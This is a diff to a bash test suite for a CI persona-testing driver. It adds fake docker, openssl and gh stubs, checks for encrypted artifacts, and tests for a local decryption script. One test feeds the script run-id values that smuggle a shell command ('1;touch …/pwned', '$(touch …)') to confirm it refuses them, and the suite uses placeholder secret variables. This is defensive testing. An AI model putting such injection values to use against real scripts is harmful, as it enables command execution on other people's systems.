@@ -83,6 +83,9 @@
 #       (a timed-out agent's leftovers are terminated). The fixture counts a request BEFORE it flushes the response (deterministic; the real
 #       server counts just after the handler returns, a race the tests cannot model: a very late request may miss the after-scrape). The stub
 #       agent makes plan["requests"] counted requests (default 1; plan["methods"] varies the verb) and plan["uncounted"] uncounted ones.
+#   TODO (OWNER/ADVISOR DECISION PENDING, no cases yet): GitHub prints a step's `env:` values in the step header BEFORE its script runs, so a model name delivered as
+#       `vars.*` is public in the job log whatever the driver does afterwards. Whether the model values become secrets (masked automatically) is being decided; see
+#       the same TODO in persona-uat-wiring-test.sh. Do not read the green log cases as covering this.
 #   (6) round 3 additions to the contract: the BEFORE-scrape continuity rule: a before-scrape that fails, or holds no positive total after an earlier
 #       persona's scrape had one (a restarted server, a broken exporter), makes the persona blocking, even with a fine after-scrape (the first persona
 #       of a fresh server may start from nothing); the AFTER-scrape settles (repeated until two readings agree) because the real server counts a request
@@ -97,6 +100,10 @@
 #       refuses sub-second precision, unknown flags, bound objects that do not exist and a persona call whose token is not an unexpired token issued for
 #       the persona's ServiceAccount with the API audience. A namespaced object applied before its Namespace is rejected by the fake. Fixture manifests
 #       that Kubernetes accepts but this driver's contract refuses (no subjects, no rules, a subject without namespace, no apiGroups) are labelled CONTRACT.
+#       Not modelled: image userspace (the curl image has no python3: the integrated case uses curl) and real UIDs (one host uid runs every fake image; ownership is
+#       pinned by the root cleanup's EXECUTED deletion semantics instead). The runner's metrics mux registers /metrics (and debug handlers this fake does not model);
+#       `/` is merely not the readiness endpoint. The API behaviour of `create token` (0s default, 10-minute floor, shortening) is modelled separately from the DRIVER's own
+#       1h-24h request policy. Hosts are inferred from command text (comments excluded, inline ones too); redirects and tool-internal contacts are not observed.
 #       The gradle/maven entrypoint models are the FAKE's (program first; the exact exit status and text of a real digest's failure cannot be checked offline).
 set -euo pipefail
 root=$(cd "$(dirname "$0")/.." && pwd)
@@ -221,6 +228,13 @@ if p.get("readonly_dir"):   # what a container of another uid leaves behind: a d
     os.makedirs(os.path.join(req["docs_dir"], "created"), exist_ok=True)
     open(os.path.join(req["docs_dir"], "created", "x"), "w").write("x")
     os.chmod(os.path.join(req["docs_dir"], "created"), 0o555)
+if p.get("foreign"):        # entries a tool image created as ANOTHER uid: hidden, nested, read-only, locked (only a root cleanup path removes them for sure)
+    base = req["docs_dir"]
+    for rel, mode in (("created/x", 0o444), (".hidden-dir/deep/y", 0o444), ("build/out/.cache/z", 0o444), (".dotfile", 0o444), ("..weird/q", 0o444), ("locked/data", 0o000)):
+        os.makedirs(os.path.dirname(os.path.join(base, rel)), exist_ok=True)
+        open(os.path.join(base, rel), "w").write("x"); os.chmod(os.path.join(base, rel), mode)
+    for d_ in ("created", ".hidden-dir/deep", "build/out/.cache", "..weird", "locked"):
+        os.chmod(os.path.join(base, d_), 0o555)
 if p.get("sleep"):
     time.sleep(p["sleep"])
 kube_rc = None
@@ -286,7 +300,7 @@ if [ "$1" = rm ] || [ "$1" = stop ] || [ "$1" = kill ]; then
 fi
 if [ "$1" = rm ]; then kill $(cat "$CASEDIR/../runner.pid" 2>/dev/null) 2>/dev/null; rm -f "${CASEDIR:?}/../runner.pid"; fi
 if [ "$1" = run ] && [ "$2" = --rm ]; then
-  python3 - "$CONTAINERS" "$@" <<'PYX'
+  CASEDIR="$CASEDIR" python3 - "$CONTAINERS" "$@" <<'PYX'
 import json, os, subprocess, sys, time
 reg, a = sys.argv[1], sys.argv[2:]
 host = next(x.split(":")[0] for i, x in enumerate(a) if i and a[i - 1] == "-v")
@@ -294,11 +308,59 @@ img = next((i for i, x in enumerate(a) if "@sha256:" in x), None)
 rest = a[img + 1:] if img is not None else []
 repo = a[img] if img is not None else ""
 if a[a.index("--user") + 1:][:1] == ["0:0"] if "--user" in a else False:
-    # a CLEANUP container: it runs as root over the mounted sandbox and empties it (what a root-owned file a tool image left behind needs)
-    import shutil
-    for child in os.listdir(host):
-        p = os.path.join(host, child)
-        shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) and not os.path.islink(p) else os.remove(p)
+    # a CLEANUP container: runs as ROOT over the mounted sandbox and EXECUTES the requested deletion with the shell's own semantics against the mapping /work -> the
+    # sandbox: `*` skips dotfiles, `.[!.]*` and `..?*` match hidden entries, a path that does not exist deletes nothing, root removes what another uid created
+    # (read-only directories, mode-000 files). It understands rm -rf (alone or in a sh -c list joined by ; or &&) and `find /work -mindepth 1 -delete`; anything
+    # else is a command the image cannot run (exit 127). The state left behind is logged, so a case can require that NOTHING remained.
+    import fnmatch, shlex, shutil
+    def expand(arg):
+        if not (arg == "/work" or arg.startswith("/work/")):
+            return []                                            # outside the mount: nothing of the sandbox
+        rel = arg[len("/work"):].strip("/")
+        if not rel:
+            raise SystemExit(1)                                  # rm: cannot remove '/work': Device or resource busy
+        parent, pat = os.path.split(rel)
+        base = os.path.join(host, parent)
+        if not any(c in pat for c in "*?["):
+            return [os.path.join(base, pat)]
+        if not os.path.isdir(base):
+            return []
+        return [os.path.join(base, n) for n in sorted(os.listdir(base)) if fnmatch.fnmatchcase(n, pat) and (pat.startswith(".") or not n.startswith("."))]
+    def wipe(path):
+        def fix(fn, p, exc):
+            os.chmod(os.path.dirname(p), 0o777); os.chmod(p, 0o777); fn(p)
+        if os.path.islink(path) or os.path.isfile(path):
+            try:
+                os.remove(path)
+            except PermissionError:
+                os.chmod(os.path.dirname(path), 0o777); os.remove(path)
+        elif os.path.isdir(path):
+            for root, dirs, files in os.walk(path):
+                os.chmod(root, 0o777)
+            shutil.rmtree(path, onerror=fix)
+    def run_simple(argv):
+        if argv[:1] == ["rm"]:
+            flags = [x for x in argv[1:] if x.startswith("-") and x != "--"]
+            if not any(("r" in f or "R" in f) for f in flags):
+                sys.stderr.write("rm: cannot remove: Is a directory\n"); raise SystemExit(1)
+            for arg in [x for x in argv[1:] if not x.startswith("-") or x == "-"]:
+                for t in expand(arg):
+                    wipe(t)
+        elif argv[:2] == ["find", "/work"] and argv[2:] == ["-mindepth", "1", "-delete"]:
+            for n in os.listdir(host):
+                wipe(os.path.join(host, n))
+        else:
+            sys.stderr.write('docker: Error response from daemon: exec: "%s": executable file not found in $PATH\n' % (argv[0] if argv else "")); raise SystemExit(127)
+    before = sorted(os.path.relpath(os.path.join(r, n), host) for r, ds, fs in os.walk(host) for n in ds + fs)
+    if rest[:2] == ["sh", "-c"] and len(rest) == 3:
+        import re as _re
+        for part in _re.split(r";|&&|\n", rest[2]):
+            if part.strip():
+                run_simple(shlex.split(part))
+    else:
+        run_simple(rest)
+    remaining = sorted(os.path.relpath(os.path.join(r, n), host) for r, ds, fs in os.walk(host) for n in ds + fs)
+    open(os.path.join(os.environ["CASEDIR"], "cleanup.log"), "a").write(json.dumps({"sandbox": host, "tail": rest, "before": before, "remaining": remaining}) + "\n")
     sys.exit(0)
 if rest[:2] == ["sh", "-c"] and len(rest) == 3:
     if "/cosign@" in repo or "/kubectl@" in repo:       # distroless images have no shell
@@ -496,11 +558,11 @@ for mm in row["manifests"]:
             finish(1, 'Error from server (NotFound): namespaces "%s" not found (a namespaced object is applied before its Namespace exists)' % md["namespace"])
 json.dump(sorted(known_ns), open(D + "/ns.json", "w"))
 def go_seconds(d):
-    """Go time.ParseDuration restricted to s, m, h; kubectl create token refuses sub-second precision"""
+    """Go time.ParseDuration restricted to s, m, h; kubectl create token refuses sub-second precision; 0 is legal (the server's default)"""
     if not re.fullmatch(r"(?:(?:[0-9]+(?:\.[0-9]*)?|\.[0-9]+)(?:s|m|h))+", d):
         return None
     v = sum(float(n) * {"s": 1, "m": 60, "h": 3600}[u] for n, u in re.findall(r"([0-9]+\.?[0-9]*|\.[0-9]+)(s|m|h)", d))
-    return v if v > 0 and abs(v - round(v)) < 1e-9 else None
+    return v if v >= 0 and abs(v - round(v)) < 1e-9 else None
 if verb == "create":
     import base64, hashlib
     opts = {}
@@ -517,11 +579,16 @@ if verb == "create":
             finish(1, "error: unknown flag: %s (kubectl create token supports --duration, --audience, --bound-object-kind, --bound-object-name, --bound-object-uid)" % t)
         i += 1
     dur = (opts.get("--duration") or [None])[0]
-    secs = go_seconds(dur) if dur is not None else 600
-    if not secs:
+    # API behaviour (NOT the driver's policy): 0 or no flag asks for the server default (1h), anything between 1s and 10 minutes is refused by the API,
+    # a request above the server's maximum is ACCEPTED and shortened (here to 24h). The driver's own 1h..24h policy is asserted separately on what it asks for.
+    secs = go_seconds(dur) if dur is not None else 0
+    if secs is None:
         finish(1, "error: invalid duration %r (whole seconds, Go syntax)" % dur)
-    if secs > 86400:
-        finish(1, "error: the requested lifetime exceeds this cluster's maximum (24h)")
+    if secs == 0:
+        secs = 3600
+    elif secs < 600:
+        finish(1, "error: Invalid value: may not specify a duration less than 10 minutes")
+    secs = min(secs, 86400)
     kind = (opts.get("--bound-object-kind") or [None])[0]
     if kind is not None or opts.get("--bound-object-name"):
         finish(1, 'error: %s "%s" not found: the bound object does not exist' % (kind or "?", (opts.get("--bound-object-name") or ["?"])[0]))
@@ -549,8 +616,19 @@ mkhost() {
   python3 - "$d" "$(command -v openssl)" "${OPENSSL_FAIL:-}" <<'PYO'
 import os, sys
 d, real, fail = sys.argv[1:4]
-open(d + "/hostbin/openssl", "w").write("#!/usr/bin/env python3\nimport json, os, sys\nopen(%r, 'a').write(json.dumps(sys.argv[1:]) + '\\n')\n"
-    "if %r and sys.argv[1:3] == ['cms', '-encrypt']:\n    sys.stderr.write('openssl: simulated failure\\n'); sys.exit(1)\nos.execv(%r, [%r] + sys.argv[1:])\n" % (d + "/openssl.log", fail, real, real))
+open(d + "/hostbin/openssl", "w").write(f"""#!/usr/bin/env python3
+import json, os, sys
+LOG, FAIL, REAL = {d + "/openssl.log"!r}, {fail!r}, {real!r}
+n = sum(1 for l in open(LOG) if '"-encrypt"' in l) + (1 if sys.argv[1:3] == ['cms', '-encrypt'] else 0)
+open(LOG, 'a').write(json.dumps(sys.argv[1:]) + '\\n')
+if FAIL and sys.argv[1:3] == ['cms', '-encrypt']:
+    # FAIL=1: every encryption fails with no output; FAIL=partial: every one writes some bytes and then fails; FAIL=<n>: only the n-th call, after partial output
+    if FAIL in ('1', 'partial') or FAIL == str(n):
+        if FAIL != '1':
+            sys.stdout.buffer.write(b'PARTIAL-CIPHERTEXT-OR-PLAINTEXT'); sys.stdout.flush()
+        sys.stderr.write('openssl: simulated failure\\n'); sys.exit(1)
+os.execv(REAL, [REAL] + sys.argv[1:])
+""")
 os.chmod(d + "/hostbin/openssl", 0o755); open(d + "/openssl.log", "w").close()
 PYO
   sed "s#__DIR__#$d#" "$work/kind.tmpl" >"$d/hostbin/kind"; sed "s#__DIR__#$d#" "$work/kubectl.tmpl" >"$d/hostbin/kubectl"; chmod +x "$d/hostbin/kind" "$d/hostbin/kubectl"
@@ -591,13 +669,19 @@ decout() { rm -rf "${work:?}/$1/plain"; python3 "$work/dec.py" "$work/$1/out" "$
 publiclog() { python3 - "$work/$1" "$PERSONAS" <<'PYL'
 import re, sys
 d, personas = sys.argv[1], sys.argv[2].split()
-lines = [l for f in ("stdout", "stderr") for l in open(d + "/" + f).read().splitlines() if l.strip()]
+import os
+srcs = ("stdout", "stderr") + (("summary.md",) if os.path.exists(d + "/summary.md") else ())     # the controlled GITHUB_STEP_SUMMARY is a public surface too
+lines = [l for f in srcs for l in open(d + "/" + f).read().splitlines() if l.strip()]
 pat = re.compile(r"^persona-uat: (%s|overall): (pass|fail)$" % "|".join(personas))
 bad = [l for l in lines if not pat.match(l)]
 assert not bad, ("the job log carries more than a pass/fail line per persona and overall", bad[:3])
 got = {}
-for l in lines:
+for l in [l for f in ("stdout", "stderr") for l in open(d + "/" + f).read().splitlines() if l.strip()]:
     m = pat.match(l); assert m.group(1) not in got, ("a duplicate line", l); got[m.group(1)] = m.group(2)
+if os.path.exists(d + "/summary.md"):       # a summary, when written, repeats the same lines and nothing else
+    for l in open(d + "/summary.md").read().splitlines():
+        if l.strip():
+            m = pat.match(l); assert m and got.get(m.group(1)) == m.group(2), ("the step summary disagrees with the log", l)
 assert sorted(got) == sorted(personas + ["overall"]), got
 assert got["overall"] == ("fail" if "fail" in [got[p] for p in personas] else "pass"), got
 for p in personas:
@@ -765,7 +849,7 @@ mkprocnet "$work/procnet"
 # run <name> <plan-json> <mode> [VAR=val ...]  (sets rc; dirs under $work/<name>/)
 run() {
   local name=$1 plan=$2 mode=$3; shift 3
-  mkdir -p "$work/plain" "$work/$name"; echo "$plan" >"$work/$name/plan.json"; : >"$work/$name/log"; : >"$work/$name/docker.log"; : >"$work/$name/gh.log"
+  mkdir -p "$work/plain" "$work/$name" "$work/$name/tmp"; : >"$work/$name/summary.md"; echo "$plan" >"$work/$name/plan.json"; : >"$work/$name/log"; : >"$work/$name/docker.log"; : >"$work/$name/gh.log"
   # the stub's failure switches are baked into the case's own docker script (the driver passes the docker client only its allowlisted DOCKER_* variables)
   sed "s#__LOG__#$work/$name/docker.log#" "$work/docker.tmpl" >"$work/$name/docker"; chmod +x "$work/$name/docker"
   { echo "DOCKER_FAIL_MATCH=$(printf %q "${DOCKER_FAIL_MATCH:-}"); DOCKER_INSPECT_FALSE=$(printf %q "${DOCKER_INSPECT_FALSE:-}"); DOCKER_NOISE=$(printf %q "${DOCKER_NOISE:-}"); DOCKER_RUNNER_DEAD=$(printf %q "${DOCKER_RUNNER_DEAD:-}")"; } >"$work/$name/docker.env"
@@ -779,7 +863,7 @@ run() {
   rc=0
   local tw=(); [ -n "${RUN_TIMEOUT:-}" ] && tw=(perl -e 'alarm shift; exec @ARGV' "$RUN_TIMEOUT")
   local t_start=$SECONDS
-  env -u PERSONA_UAT_TOKEN_BUDGET GITHUB_RUN_ID=4242 GITHUB_REPOSITORY=own/cache \
+  env -u PERSONA_UAT_TOKEN_BUDGET TMPDIR="$work/$name/tmp" GITHUB_STEP_SUMMARY="$work/$name/summary.md" GITHUB_RUN_ID=4242 GITHUB_REPOSITORY=own/cache \
       GITHUB_TOKEN=SECRET-GH-TOKEN GH_TOKEN=SECRET-GH2 AWS_SECRET_ACCESS_KEY=SECRET-AWS-KEY REPO_CHECKOUT="$repo" \
       GITHUB_WORKSPACE="$repo" ACTIONS_ID_TOKEN_REQUEST_TOKEN=SECRET-OIDC ACTIONS_ID_TOKEN_REQUEST_URL=http://oidc.invalid \
       ACTIONS_RUNTIME_TOKEN=SECRET-RT ANTHROPIC_API_KEY=ALLOWED-MODEL-CRED ANTHROPIC_IDENTITY_TOKEN_FILE=/x/token SOME_UNKNOWN_SECRET=SECRET-UNK AWS_SESSION_TOKEN=SECRET-AWS2 \
@@ -1609,8 +1693,9 @@ check python3 - "$work" <<'PY'
 import glob, subprocess, sys
 w = sys.argv[1]
 def dec(f, key):
+    cert = key[:-4] + ".pem"       # -recip <cert> makes a wrong key FAIL deterministically (without it openssl "succeeds" with garbage about 1 time in 256)
     for inf in ("DER", "PEM", "SMIME"):
-        r = subprocess.run(["openssl", "cms", "-decrypt", "-inform", inf, "-inkey", key, "-in", f], capture_output=True)
+        r = subprocess.run(["openssl", "cms", "-decrypt", "-inform", inf, "-recip", cert, "-inkey", key, "-in", f], capture_output=True)
         if r.returncode == 0:
             return r.stdout
     return None
@@ -1631,21 +1716,32 @@ enc = [c for c in calls if c[:2] == ["cms", "-encrypt"]]
 assert len(enc) == 5, calls
 for c in enc:
     assert "-aes-256-cbc" in c or "-aes256" in c, c
+    assert "-binary" in c, ("without -binary openssl cms turns every LF into CRLF: the payload would not be what was written", c)
     assert pem in c, ("the recipient certificate is not an argument", c)
     assert "-in" not in c and not [x for x in c if x.endswith((".md", ".txt", ".payload", ".report", ".transcript"))], ("plaintext handed over as a file", c)
     assert not [x for x in c if x.startswith("-passin") or x.startswith("-pass")], c
 PY
-CASE="openssl failing means NO artifact and a failing run: the driver never falls back to plaintext (exit non-zero, --out holds no .md/.txt/.json/.payload file, five fail lines)"
-OPENSSL_FAIL=1 run encfail '{}' rc
-check python3 - "$work/encfail" "$rc" "$PERSONAS" <<'PY'
-import glob, os, re, sys
+CASE_ENC="encryption failure leaves NOTHING uploadable: after ANY failed encryption (no output, partial output, or only the third persona's) --out holds NO file at all (no .cms, not even an earlier persona's good one: the always() upload must find nothing), no file in it is plaintext, the run fails (exit 1) with only pass/fail lines, and nothing readable is left in the private TMPDIR"
+for mode in 1 partial 3; do
+  OPENSSL_FAIL=$mode run "encfail-$mode" '{}' rc
+  CASE="$CASE_ENC (mode $mode)"
+  check python3 - "$work/encfail-$mode" "$rc" "$PERSONAS" <<'PY'
+import os, re, sys
 d, rc = sys.argv[1], int(sys.argv[2])
-assert rc != 0
-assert not [f for f in os.listdir(d + "/out") if not f.endswith(".cms")], os.listdir(d + "/out")
-lines = [l for f in ("stdout", "stderr") for l in open(d + "/" + f).read().splitlines() if l.strip()]
+assert rc == 1, rc
+left = [os.path.join(r, f) for r, _, fs in os.walk(d + "/out") for f in fs] if os.path.isdir(d + "/out") else []
+assert left == [], ("an uploadable file survived a failed encryption", left)
+lines = [l for f in ("stdout", "stderr", "summary.md") for l in open(d + "/" + f).read().splitlines() if l.strip()]
 assert all(re.match(r"^persona-uat: ([a-z-]+|overall): (pass|fail)$", l) for l in lines), lines
 assert "persona-uat: overall: fail" in lines
+for r, _, fs in os.walk(d + "/tmp"):
+    for f in fs:
+        c = open(os.path.join(r, f), "rb").read()
+        assert b"VERDICT" not in c and b"TRANSCRIPT for" not in c and b"PARTIAL-" not in c, ("readable report text left in TMPDIR", f)
 PY
+done
+CASE="a persona whose encryption failed reads fail in the log (the third call = compliance-reviewer), the others by their own verdict"
+check grep -q "persona-uat: compliance-reviewer: fail" "$work/encfail-3/stderr"
 for bad in missing garbage privatekey; do
   case $bad in missing) rec="$work/no-such-recipient.pem";; garbage) echo "not a certificate" >"$work/garbage.pem"; rec="$work/garbage.pem";; privatekey) rec="$work/test.key";; esac
   RECIPIENT="$rec" run "badrec-$bad" '{}' rc
@@ -1668,59 +1764,97 @@ for f in ("bin/persona-uat.py", "bin/persona-uat-agent.py", "bin/persona-uat-pro
     assert "persona-uat.key" not in open(os.path.join(root, f)).read(), f
 PY
 
-# --- the local decryption script (bin/persona-uat-decrypt.sh <run id> [key path]) with a fake gh and the test key -----------------------------------
+# --- the local decryption script (bin/persona-uat-decrypt.sh <run id> [key path]) with a FAITHFUL fake gh and the test key -------------------------------
+# The fake `gh run download` behaves like the real one: it needs a repository (-R owner/repo, or a git clone as the working directory), a numeric run id and only
+# known flags; WITHOUT -n it downloads EVERY artifact of the run into DIR/<artifact name>/; with exactly ONE -n NAME it downloads just that artifact FLAT into DIR; an
+# unknown name fails; several -n nest again. The run holds the persona artifact AND an unrelated one (with a decoy .cms encrypted for someone else).
 dsh="$root/bin/persona-uat-decrypt.sh"
-mkdir -p "$work/dsh/bin" "$work/dsh/art"
-cp "$work/clean/out/"*.cms "$work/dsh/art/" 2>/dev/null || true
+ARTNAME="persona-uat-encrypted"
+mkdir -p "$work/dsh/bin" "$work/dsh/run/$ARTNAME" "$work/dsh/run/other-artifact" "$work/dsh/clone" "$work/dsh/nogit"
+cp "$work/clean/out/"*.cms "$work/dsh/run/$ARTNAME/" 2>/dev/null || true
+openssl cms -encrypt -aes-256-cbc -binary -outform DER -recip "$work/other.pem" -out "$work/dsh/run/other-artifact/decoy.cms" <<<"not for us" 2>/dev/null || true
+echo "unrelated notes" >"$work/dsh/run/other-artifact/notes.txt"
+git -C "$work/dsh/clone" init -q 2>/dev/null || true
 cat >"$work/dsh/bin/gh" <<'SH'
 #!/bin/sh
-# fake gh: `gh run download <id> [-D|--dir DIR] [-n|--name NAME]` copies the fixture artifact into DIR; logs the call; FAKE_GH_FAIL=1 fails
+# fake gh run download: FAKE_RUN is the run's artifact root (one directory per artifact); FAKE_GH_FAIL=1 fails; every call is logged
 echo "$*" >>"$FAKE_GH_LOG"
 [ -z "${FAKE_GH_FAIL:-}" ] || { echo "gh: simulated failure" >&2; exit 1; }
 [ "$1 $2" = "run download" ] || { echo "unexpected gh call" >&2; exit 1; }
-dir=.
-while [ $# -gt 0 ]; do case "$1" in -D|--dir) dir=$2; shift;; esac; shift; done
-mkdir -p "$dir"; cp "$FAKE_ART"/* "$dir"/
+shift 2
+id=""; dir=.; repo=""; names=""; n=0
+while [ $# -gt 0 ]; do
+  case "$1" in
+    -D|--dir) dir=$2; shift 2;;
+    -D=*|--dir=*) dir=${1#*=}; shift;;
+    -R|--repo) repo=$2; shift 2;;
+    -R=*|--repo=*) repo=${1#*=}; shift;;
+    -n|--name) names="$names $2"; n=$((n+1)); shift 2;;
+    -n=*|--name=*) names="$names ${1#*=}"; n=$((n+1)); shift;;
+    -*) echo "unknown flag: $1" >&2; exit 1;;
+    *) [ -z "$id" ] || { echo "accepts at most 1 arg(s)" >&2; exit 1; }; id=$1; shift;;
+  esac
+done
+case "$id" in ""|*[!0-9]*) echo "invalid run id: '$id'" >&2; exit 1;; esac
+if [ -z "$repo" ]; then git rev-parse --git-dir >/dev/null 2>&1 || { echo "failed to determine base repo: no git remotes found (use -R owner/repo)" >&2; exit 1; }
+else case "$repo" in */*) ;; *) echo "expected the [HOST/]OWNER/REPO format" >&2; exit 1;; esac; fi
+mkdir -p "$dir"
+if [ "$n" -eq 0 ]; then
+  for a in "$FAKE_RUN"/*; do mkdir -p "$dir/$(basename "$a")"; cp "$a"/* "$dir/$(basename "$a")/"; done
+elif [ "$n" -eq 1 ]; then
+  name=${names# }; [ -d "$FAKE_RUN/$name" ] || { echo "no artifact matches any of the names or patterns provided" >&2; exit 1; }
+  cp "$FAKE_RUN/$name"/* "$dir/"
+else
+  for name in $names; do [ -d "$FAKE_RUN/$name" ] || { echo "no artifact matches: $name" >&2; exit 1; }; mkdir -p "$dir/$name"; cp "$FAKE_RUN/$name"/* "$dir/$name/"; done
+fi
 SH
 chmod +x "$work/dsh/bin/gh"
-dsh_run() { # <run id> [key path or NOKEY] ; env FAKE_GH_FAIL ; sets drc, stdout/stderr in $work/dsh/{o,e}
+dsh_run() { # <run id> [key path or NOKEY] ; env FAKE_GH_FAIL, FAKE_RUN, DSH_CWD ; sets drc, stdout/stderr in $work/dsh/{o,e}
   rm -rf "${work:?}/dsh/tmp"; mkdir -p "$work/dsh/tmp"; : >"$work/dsh/gh.log"; drc=0
+  local cwd="${DSH_CWD:-$work/dsh/clone}"
   if [ "${2:-}" = NOKEY ]; then
-    env HOME="$work/dsh/home" PATH="$work/dsh/bin:$PATH" FAKE_GH_LOG="$work/dsh/gh.log" FAKE_ART="$work/dsh/art" TMPDIR="$work/dsh/tmp" bash "$dsh" "$1" >"$work/dsh/o" 2>"$work/dsh/e" || drc=$?
+    (cd "$cwd" && env HOME="$work/dsh/home" PATH="$work/dsh/bin:$PATH" FAKE_GH_LOG="$work/dsh/gh.log" FAKE_RUN="${FAKE_RUN:-$work/dsh/run}" TMPDIR="$work/dsh/tmp" bash "$dsh" "$1") >"$work/dsh/o" 2>"$work/dsh/e" || drc=$?
   else
-    env HOME="$work/dsh/home" PATH="$work/dsh/bin:$PATH" FAKE_GH_LOG="$work/dsh/gh.log" FAKE_ART="$work/dsh/art" TMPDIR="$work/dsh/tmp" bash "$dsh" "$1" ${2:+"$2"} >"$work/dsh/o" 2>"$work/dsh/e" || drc=$?
+    (cd "$cwd" && env HOME="$work/dsh/home" PATH="$work/dsh/bin:$PATH" FAKE_GH_LOG="$work/dsh/gh.log" FAKE_RUN="${FAKE_RUN:-$work/dsh/run}" TMPDIR="$work/dsh/tmp" bash "$dsh" "$1" ${2:+"$2"}) >"$work/dsh/o" 2>"$work/dsh/e" || drc=$?
   fi
 }
 mkdir -p "$work/dsh/home" "$work/dsh/tmp"
 dsh_run 4242 "$work/test.key"
-CASE="persona-uat-decrypt.sh: a run id and the right key: gh run download <id> is called, every artifact is decrypted, the plaintext is exactly what the test run's reports and transcripts were, and it says where"
-check python3 - "$work" "$drc" <<'PY'
+CASE="persona-uat-decrypt.sh against a faithful gh (the run holds the persona artifact AND an unrelated one with a decoy .cms): it downloads the persona artifact by its EXACT name (exactly one -n, flat), the run id and a directory it owns, decrypts exactly the five persona files, and never touches the unrelated artifact; it says where"
+check python3 - "$work" "$drc" "$ARTNAME" <<'PY'
 import glob, os, re, sys
-w, rc = sys.argv[1], int(sys.argv[2])
+w, rc, art = sys.argv[1], int(sys.argv[2]), sys.argv[3]
 assert rc == 0, open(w + "/dsh/e").read()
-gh = open(w + "/dsh/gh.log").read().split("\n")
-assert any(l.startswith("run download 4242") for l in gh), gh
+gh = [l for l in open(w + "/dsh/gh.log").read().split("\n") if l]
+assert len(gh) == 1 and gh[0].split()[:3] == ["run", "download", "4242"], gh
+toks = gh[0].split()
+names = [toks[i + 1] for i, t in enumerate(toks) if t in ("-n", "--name")] + [t.split("=", 1)[1] for t in toks if t.startswith(("-n=", "--name="))]
+assert names == [art], ("exactly one -n with the persona artifact's exact name (an omitted name downloads everything, nested)", names)
 m = re.search(r"decrypted into (\S+)", open(w + "/dsh/o").read())
 assert m, open(w + "/dsh/o").read()
 d = m.group(1)
-assert os.path.isdir(d), d
 want = {os.path.basename(f)[:-len(".payload")]: open(f).read() for f in glob.glob(w + "/clean/plain/*.payload")}
 got = {os.path.basename(f).rsplit(".", 1)[0]: open(f).read() for f in glob.glob(d + "/*") if os.path.isfile(f)}
 assert sorted(got) == sorted(want) and all(got[k] == want[k] for k in want), (sorted(got), sorted(want))
+assert "decoy" not in got and "notes" not in got
 PY
 CASE="persona-uat-decrypt.sh: the plaintext lives ONLY under a mode-700 directory the script creates with mktemp (inside TMPDIR), its files are not readable by others, and the directory it names is that one"
 check python3 - "$work" <<'PY'
 import os, re, stat, sys
 w = sys.argv[1]
 d = re.search(r"decrypted into (\S+)", open(w + "/dsh/o").read()).group(1)
-assert os.path.dirname(d.rstrip("/")) == w + "/dsh/tmp" or d.startswith(w + "/dsh/tmp"), d
+assert os.path.dirname(d.rstrip("/")) == w + "/dsh/tmp", d
 assert stat.S_IMODE(os.stat(d).st_mode) == 0o700, oct(os.stat(d).st_mode)
 for f in os.listdir(d):
     assert stat.S_IMODE(os.stat(os.path.join(d, f)).st_mode) & 0o077 == 0, f
-# nothing else in TMPDIR or HOME holds plaintext markers
+    assert not f.startswith("."), ("a leftover download directory", f)
 for root_, _, fs in os.walk(w + "/dsh/home"):
     for f in fs:
         assert b"VERDICT" not in open(os.path.join(root_, f), "rb").read(), f
+for root_, _, fs in os.walk(w + "/dsh/clone"):
+    for f in fs:
+        if ".git/" not in os.path.join(root_, f):
+            assert b"VERDICT" not in open(os.path.join(root_, f), "rb").read(), ("plaintext in the working directory", f)
 PY
 CASE="persona-uat-decrypt.sh never prints the key: neither the key text nor a private-key block is on stdout or stderr (success and failure)"
 check python3 - "$work" <<'PY'
@@ -1732,15 +1866,21 @@ blob = open(w + "/dsh/o").read() + open(w + "/dsh/e").read()
 assert "PRIVATE" not in blob and not [l for l in body if l in blob], blob[:200]
 PY
 dsh_run 4242 "$work/other.key"
-CASE="persona-uat-decrypt.sh: the WRONG key fails (non-zero, says so), and leaves no plaintext behind"
+CASE="persona-uat-decrypt.sh: the WRONG key fails (non-zero, says so) and leaves no plaintext behind (openssl may even 'succeed' with garbage for a wrong key about 1 time in 256: the script must check what it decrypted)"
 check python3 - "$work" "$drc" <<'PY'
 import glob, os, sys
 w, rc = sys.argv[1], int(sys.argv[2])
 assert rc != 0
-assert not glob.glob(w + "/dsh/tmp/*/*") , glob.glob(w + "/dsh/tmp/*/*")
+assert not glob.glob(w + "/dsh/tmp/*/*") and not glob.glob(w + "/dsh/tmp/*"), glob.glob(w + "/dsh/tmp/*")
 blob = open(w + "/dsh/o").read() + open(w + "/dsh/e").read()
 assert "VERDICT" not in blob and "PRIVATE" not in blob
 PY
+# an artifact that decrypts fine but is NOT a persona payload (what a wrong key can yield as garbage, or a foreign file): the script must refuse it
+mkdir -p "$work/dsh/run-garbage/$ARTNAME"
+openssl cms -encrypt -aes-256-cbc -binary -outform DER -recip "$work/test.pem" -out "$work/dsh/run-garbage/$ARTNAME/gradle-platform-engineer.cms" <<<"random bytes that are not a report" 2>/dev/null
+FAKE_RUN="$work/dsh/run-garbage" dsh_run 4242 "$work/test.key"
+CASE="persona-uat-decrypt.sh refuses a decrypted file that is not a persona payload (it must begin with 'VERDICT: ' and hold the '=== TRANSCRIPT ===' line): non-zero, no plaintext left"
+check test "$drc" -ne 0 -a -z "$(ls "$work"/dsh/tmp/* 2>/dev/null | head -1)"
 dsh_run 4242 "$work/dsh/no-such.key"
 CASE="persona-uat-decrypt.sh refuses a missing key (non-zero, names the missing path) BEFORE it calls gh"
 check test "$drc" -ne 0 -a ! -s "$work/dsh/gh.log"
@@ -1760,20 +1900,38 @@ for rid in "" "abc" "12 34" "1;touch $work/dsh/pwned" '$(touch '"$work"'/dsh/pwn
 done
 FAKE_GH_FAIL=1 dsh_run 4242 "$work/test.key"
 CASE="persona-uat-decrypt.sh: a failing gh run download fails the script (non-zero) and leaves no plaintext directory content"
-check test "$drc" -ne 0 -a -z "$(ls "$work"/dsh/tmp/*/* 2>/dev/null | head -1)"
-mv "$work/dsh/art" "$work/dsh/art-keep"; mkdir -p "$work/dsh/art"; echo plain >"$work/dsh/art/notes.txt"
-dsh_run 4242 "$work/test.key"
+check test "$drc" -ne 0 -a -z "$(ls "$work"/dsh/tmp/* 2>/dev/null | head -1)"
+mkdir -p "$work/dsh/run-nocms/$ARTNAME"; echo plain >"$work/dsh/run-nocms/$ARTNAME/notes.txt"
+FAKE_RUN="$work/dsh/run-nocms" dsh_run 4242 "$work/test.key"
 CASE="persona-uat-decrypt.sh: an artifact without any .cms file is an error (non-zero), never an empty success"
 check test "$drc" -ne 0
